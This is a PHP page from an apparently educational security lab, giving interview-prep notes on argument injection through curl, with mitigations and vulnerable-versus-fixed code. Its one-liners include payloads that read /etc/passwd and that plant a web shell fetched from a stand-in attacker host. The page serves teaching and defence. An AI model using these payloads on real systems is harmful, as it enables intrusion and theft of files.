<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'Interview Prep — Argument Injection';
$lab_id = 'cmd_c4';
include __DIR__ . '/includes/header.php';
?>
<div class="interview-page">

  <div style="margin-bottom:8px;">
    <a href="/cmd_c4.php" class="btn btn-ghost btn-sm">&larr; Back to Lab C4</a>
  </div>

  <h1>Argument Injection</h1>
  <p class="subtitle">Interview prep for Lab C4 — injecting flags into programs without using shell separators.</p>

  <!-- 30-Second Answer -->
  <div class="interview-section">
    <h2>30-Second Answer</h2>
    <div class="thirty-sec">
      "Argument injection occurs when input is sanitized against shell metacharacters but spaces remain, allowing an attacker to inject extra flags or options into the invoked program — without ever using a shell separator."
    </div>
  </div>

  <!-- Common Interview Questions -->
  <div class="interview-section">
    <h2>Common Interview Questions</h2>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q1">
      <label class="qa-question" for="q1">What's the difference between escapeshellarg and escapeshellcmd?</label>
      <div class="qa-answer">
        <code>escapeshellarg()</code> wraps a value in single quotes and escapes any single quotes inside — it is safe for passing a <em>single argument</em> to a shell command. The result is treated as one opaque string by the shell.<br><br>
        <code>escapeshellcmd()</code> escapes metacharacters with backslashes across the entire string — but it leaves <strong>spaces</strong> untouched, which means an attacker can still inject extra arguments/flags by including spaces in their input. It is insufficient for argument-level protection.<br><br>
        Rule of thumb: always use <code>escapeshellarg()</code> on each individual argument, not <code>escapeshellcmd()</code> on the whole string.
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q2">
      <label class="qa-question" for="q2">Why is escaping still not enough?</label>
      <div class="qa-answer">
        Even with proper escaping, argument injection can occur if the argument position itself is vulnerable — for example, if an attacker can supply a value that starts with <code>-</code> and the program interprets it as a flag rather than a value. Mitigations include:<br><br>
        <strong>Argument terminator (<code>--</code>):</strong> Pass <code>--</code> before user-controlled input to signal to the program that no more flags follow: <code>curl -s -- $url</code>.<br>
        <strong>Strict allowlist:</strong> Only accept input matching a known-good pattern (e.g., a hostname or IP regex) before passing it anywhere near a command.<br>
        <strong>Avoid shell-outs entirely:</strong> Use native HTTP libraries instead of calling <code>curl</code> as a subprocess.
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q3">
      <label class="qa-question" for="q3">How do you exploit argument injection with curl?</label>
      <div class="qa-answer">
        If user input is appended to <code>curl -s &lt;input&gt;</code> and spaces survive sanitization, the attacker can inject additional curl flags. For example:<br><br>
        <code>-o /tmp/out.txt file:///etc/passwd</code><br><br>
        This causes curl to write the local flag file to a temp path. If there is also a way to read that temp path (a debug viewer, a log endpoint, a file upload directory), the contents can be retrieved. No shell separator is needed — this is purely flag injection at the argument level.
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q4">
      <label class="qa-question" for="q4">What programs are most commonly exploited via argument injection?</label>
      <div class="qa-answer">
        Any CLI tool that accepts rich flags is a candidate: <code>curl</code> (<code>-o</code>, <code>-K</code> for config files), <code>wget</code> (<code>-O</code>), <code>git</code> (various subcommands), <code>ssh</code> (<code>-o ProxyCommand=...</code>), <code>rsync</code>, <code>ffmpeg</code>, <code>convert</code> (ImageMagick). The attack surface is determined by the number of flags the underlying tool supports and whether any write to files, make network connections, or execute code.
      </div>
    </div>
  </div>

  <!-- Dev Fix -->
  <div class="interview-section">
    <h2>Dev Fix</h2>
    <p>Replace the shell-out with a native HTTP library. If curl must be called, use an allowlist, <code>escapeshellarg()</code>, and the <code>--</code> terminator.</p>
    <div class="terminal" style="margin-top:12px;">
      <span class="comment">// Wrong — metachar filter leaves spaces, enabling arg injection</span><br>
      <span style="color:var(--red);">$safe = preg_replace('/[;&|`$&lt;&gt;\'\"\\\\]/', '', $_GET['url']);<br>
shell_exec("curl -s " . $safe);</span><br><br>
      <span class="comment">// Better — allowlist + escapeshellarg + -- terminator</span><br>
      <span style="color:var(--accent);">if (!preg_match('~^https?://[a-zA-Z0-9.\-/]+$~', $_GET['url'])) die("Invalid URL");<br>
shell_exec("curl -s -- " . escapeshellarg($_GET['url']));</span><br><br>
      <span class="comment">// Best — native PHP, no shell at all</span><br>
      <span style="color:var(--accent);">$ch = curl_init($_GET['url']);<br>
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);<br>
$output = curl_exec($ch);</span>
    </div>
  </div>

  <!-- One-liners to Remember -->
  <div class="interview-section">
    <h2>One-Liners to Remember</h2>
    <div class="oneliner">-o /tmp/out.txt file:///etc/passwd</div>
    <div class="oneliner">-o /var/www/html/shell.php http://attacker.com/shell.php</div>
    <div class="oneliner">-K /etc/passwd  (curl config file injection)</div>
  </div>

  <!-- Red Flags -->
  <div class="interview-section">
    <h2>Red Flags (Things NOT to Say)</h2>
    <div class="red-flag-item">
      <span>&#9888;</span>
      <span><strong>"escapeshellcmd() is enough"</strong> — it leaves spaces, which is the core of argument injection. Always use <code>escapeshellarg()</code> per argument and add the <code>--</code> terminator.</span>
    </div>
    <div class="red-flag-item">
      <span>&#9888;</span>
      <span><strong>"There are no shell metacharacters so it's safe"</strong> — argument injection requires no metacharacters at all, only spaces and a program with useful flags.</span>
    </div>
  </div>

  <div style="text-align:center;margin-top:48px;">
    <a href="/cmd_c4.php" class="btn btn-primary">Back to Lab C4 &rarr;</a>
  </div>
</div>
<?php include __DIR__ . '/includes/footer.php'; ?>
